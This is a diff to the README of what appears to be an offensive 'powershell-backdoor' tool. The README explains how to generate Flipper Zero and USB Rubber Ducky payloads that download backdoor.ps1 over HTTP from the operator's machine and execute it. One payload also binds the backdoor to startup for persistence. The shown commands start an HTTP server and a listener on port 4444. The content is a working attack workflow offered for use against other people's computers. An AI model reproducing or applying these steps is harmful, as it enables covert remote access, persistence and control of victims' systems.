@@ -68,10 +68,11 @@ When using any of these attacks you will be opening up a HTTP server hosting the
 
 ## Payloads
    * Execute -- Execute the backdoor 
-   * BindAndExecute -- Place the backdoor in temp, bind the backdoor to startup and then execute it.
+   * BindAndExecute -- Place the backdoor in the users temp directory, bind the backdoor to startup and then execute it. (Requires Admin)
 ## Flipper Zero Backdoor
+Below will generate a file called powershell_backdoor.txt, which when triggered on the Flipper will fetch the backdoor from your computer over HTTP and execute it.
 ```
-C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --flipper powershell_backdoor.txt --payload execute
+C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --flipper powershell_backdoor --payload execute
 [*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
 [*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
 ```
@@ -79,6 +80,7 @@ Place the text file you specified (e.g: powershell_backdoor.txt) into your flipp
 it will download and execute backdoor.ps1
 
 ## Usb Rubber Ducky Backdoor
+Below is a tutorial on how to generate an inject.bin file for the Hak5 USB Rubber ducky
 ```
  C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --ducky --payload BindAndExecute
 [*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
